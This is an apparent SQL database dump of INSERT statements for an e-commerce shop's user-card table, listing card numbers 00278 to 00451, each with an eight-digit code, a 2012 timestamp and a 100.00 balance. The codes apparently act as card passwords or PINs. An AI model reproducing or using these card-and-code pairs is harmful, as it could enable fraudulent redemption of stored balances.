INSERT INTO `ec22703249_user_card` VALUES ('1451', '0', '1', '', '00451', '84102635', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1450', '0', '1', '', '00450', '68931690', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1449', '0', '1', '', '00449', '61630716', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1448', '0', '1', '', '00448', '67632827', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1447', '0', '1', '', '00447', '32557208', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1446', '0', '1', '', '00446', '66231901', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1445', '0', '1', '', '00445', '71867616', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1444', '0', '1', '', '00444', '57961289', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1443', '0', '1', '', '00443', '62012269', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1442', '0', '1', '', '00442', '56845750', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1441', '0', '1', '', '00441', '39029309', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1440', '0', '1', '', '00440', '76932948', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1439', '0', '1', '', '00439', '48410118', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1438', '0', '1', '', '00438', '66354573', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1437', '0', '1', '', '00437', '72272281', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1436', '0', '1', '', '00436', '75052836', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1435', '0', '1', '', '00435', '60314207', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1434', '0', '1', '', '00434', '75522607', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1433', '0', '1', '', '00433', '58525269', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1432', '0', '1', '', '00432', '81410535', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1431', '0', '1', '', '00431', '76268916', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1430', '0', '1', '', '00430', '77891788', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1429', '0', '1', '', '00429', '90532062', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1428', '0', '1', '', '00428', '15663232', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1427', '0', '1', '', '00427', '74405909', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1426', '0', '1', '', '00426', '53100928', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1425', '0', '1', '', '00425', '81625363', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1424', '0', '1', '', '00424', '56149813', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1423', '0', '1', '', '00423', '72915563', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1422', '0', '1', '', '00422', '74454102', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1421', '0', '1', '', '00421', '31902509', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1420', '0', '1', '', '00420', '88585085', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1419', '0', '1', '', '00419', '50893302', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1418', '0', '1', '', '00418', '76739236', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1417', '0', '1', '', '00417', '94613867', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1416', '0', '1', '', '00416', '66021416', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1415', '0', '1', '', '00415', '27694406', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1414', '0', '1', '', '00414', '68231547', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1413', '0', '1', '', '00413', '97749081', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1412', '0', '1', '', '00412', '26417926', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1411', '0', '1', '', '00411', '69408593', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1410', '0', '1', '', '00410', '89405306', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1409', '0', '1', '', '00409', '60962574', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1408', '0', '1', '', '00408', '35390767', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1407', '0', '1', '', '00407', '95074392', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1406', '0', '1', '', '00406', '37432330', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1405', '0', '1', '', '00405', '26346762', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1404', '0', '1', '', '00404', '29713228', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1403', '0', '1', '', '00403', '40269956', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1402', '0', '1', '', '00402', '51869509', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1401', '0', '1', '', '00401', '89290833', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1400', '0', '1', '', '00400', '84346065', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1399', '0', '1', '', '00399', '93790945', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1398', '0', '1', '', '00398', '62227923', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1397', '0', '1', '', '00397', '17736411', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1396', '0', '1', '', '00396', '46091764', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1395', '0', '1', '', '00395', '52419919', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1394', '0', '1', '', '00394', '82222302', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1393', '0', '1', '', '00393', '88036561', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1392', '0', '1', '', '00392', '11910437', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1391', '0', '1', '', '00391', '52200040', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1390', '0', '1', '', '00390', '89910961', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1389', '0', '1', '', '00389', '72033216', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1388', '0', '1', '', '00388', '39222724', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1387', '0', '1', '', '00387', '24093657', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1386', '0', '1', '', '00386', '61005484', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1385', '0', '1', '', '00385', '13563566', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1384', '0', '1', '', '00384', '82581942', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1383', '0', '1', '', '00383', '14453123', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1382', '0', '1', '', '00382', '85378765', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1381', '0', '1', '', '00381', '75372202', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1380', '0', '1', '', '00380', '65556438', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1379', '0', '1', '', '00379', '41335971', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1378', '0', '1', '', '00378', '86005976', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1377', '0', '1', '', '00377', '18848037', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1376', '0', '1', '', '00376', '11553532', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1375', '0', '1', '', '00375', '62124677', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1374', '0', '1', '', '00374', '80304419', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1373', '0', '1', '', '00373', '20344644', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1372', '0', '1', '', '00372', '21532491', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1371', '0', '1', '', '00371', '40083735', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1370', '0', '1', '', '00370', '83827967', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1369', '0', '1', '', '00369', '29359524', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1368', '0', '1', '', '00368', '76992038', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1367', '0', '1', '', '00367', '53834984', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1366', '0', '1', '', '00366', '60657075', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1365', '0', '1', '', '00365', '69788865', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1364', '0', '1', '', '00364', '82093116', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1363', '0', '1', '', '00363', '29705083', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1362', '0', '1', '', '00362', '97247985', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1361', '0', '1', '', '00361', '67953452', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1360', '0', '1', '', '00360', '99232275', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1359', '0', '1', '', '00359', '82680887', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1358', '0', '1', '', '00358', '12731990', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1357', '0', '1', '', '00357', '25819623', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1356', '0', '1', '', '00356', '52996755', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1355', '0', '1', '', '00355', '14392896', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1354', '0', '1', '', '00354', '55421564', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1353', '0', '1', '', '00353', '55937686', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1352', '0', '1', '', '00352', '77928779', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1351', '0', '1', '', '00351', '17204051', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1350', '0', '1', '', '00350', '42641395', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1349', '0', '1', '', '00349', '18147313', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1348', '0', '1', '', '00348', '84554826', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1347', '0', '1', '', '00347', '92603335', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1346', '0', '1', '', '00346', '48704299', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1345', '0', '1', '', '00345', '86266203', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1344', '0', '1', '', '00344', '40843373', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1343', '0', '1', '', '00343', '32599268', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1342', '0', '1', '', '00342', '89546934', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1341', '0', '1', '', '00341', '88727552', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1340', '0', '1', '', '00340', '97117525', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1339', '0', '1', '', '00339', '72363318', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1338', '0', '1', '', '00338', '11948134', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1337', '0', '1', '', '00337', '48922059', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1336', '0', '1', '', '00336', '62847369', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1335', '0', '1', '', '00335', '84682446', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1334', '0', '1', '', '00334', '62804523', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1333', '0', '1', '', '00333', '14861052', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1332', '0', '1', '', '00332', '55454712', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1331', '0', '1', '', '00331', '27132651', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1330', '0', '1', '', '00330', '71730963', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1329', '0', '1', '', '00329', '17911956', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1328', '0', '1', '', '00328', '63680797', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1327', '0', '1', '', '00327', '96002972', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1326', '0', '1', '', '00326', '17276745', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1325', '0', '1', '', '00325', '73139942', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1324', '0', '1', '', '00324', '50145939', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1323', '0', '1', '', '00323', '39108510', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1322', '0', '1', '', '00322', '92408954', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1321', '0', '1', '', '00321', '36269719', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1320', '0', '1', '', '00320', '81033972', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1319', '0', '1', '', '00319', '34696750', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1318', '0', '1', '', '00318', '63596204', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1317', '0', '1', '', '00317', '18019904', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1316', '0', '1', '', '00316', '36095278', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1315', '0', '1', '', '00315', '51235051', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1314', '0', '1', '', '00314', '90445913', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1313', '0', '1', '', '00313', '68199127', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1312', '0', '1', '', '00312', '77256399', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1311', '0', '1', '', '00311', '14468615', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1310', '0', '1', '', '00310', '15623570', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1309', '0', '1', '', '00309', '54846762', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1308', '0', '1', '', '00308', '68736232', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1307', '0', '1', '', '00307', '19872306', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1306', '0', '1', '', '00306', '98365621', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1305', '0', '1', '', '00305', '95507045', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1304', '0', '1', '', '00304', '85190070', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1303', '0', '1', '', '00303', '30022735', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1302', '0', '1', '', '00302', '47171317', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1301', '0', '1', '', '00301', '17827352', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1300', '0', '1', '', '00300', '18677840', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1299', '0', '1', '', '00299', '48548298', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1298', '0', '1', '', '00298', '98780698', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1297', '0', '1', '', '00297', '64853683', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1296', '0', '1', '', '00296', '95878170', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1295', '0', '1', '', '00295', '47862463', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1294', '0', '1', '', '00294', '18588648', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1293', '0', '1', '', '00293', '62242723', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1292', '0', '1', '', '00292', '24893233', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1291', '0', '1', '', '00291', '11469790', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1290', '0', '1', '', '00290', '95948365', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1289', '0', '1', '', '00289', '75726832', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1288', '0', '1', '', '00288', '44078172', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1287', '0', '1', '', '00287', '42097257', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1286', '0', '1', '', '00286', '51210812', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1285', '0', '1', '', '00285', '15926836', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1284', '0', '1', '', '00284', '85279670', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1283', '0', '1', '', '00283', '47810562', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1282', '0', '1', '', '00282', '11939773', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1281', '0', '1', '', '00281', '45552283', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1280', '0', '1', '', '00280', '72366050', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1279', '0', '1', '', '00279', '11965545', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1278', '0', '1', '', '00278', '53543713', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
